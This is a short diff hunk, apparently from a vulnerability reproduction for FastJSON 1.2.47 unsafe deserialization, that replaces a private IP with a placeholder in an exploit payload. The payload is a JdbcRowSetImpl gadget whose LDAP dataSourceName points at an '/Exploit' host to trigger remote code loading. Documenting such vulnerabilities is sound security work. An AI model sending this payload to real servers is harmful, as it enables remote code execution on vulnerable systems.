@@ -58,7 +58,7 @@ FastJSON 1.2.47 unsafe deserialization
     },
     "x":{
         "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"ldap://192.168.134.130:9999/Exploit",
+        "dataSourceName":"ldap://XXX.XXX.XXX.XXX:9999/Exploit",
         "autoCommit":true
     }
   }
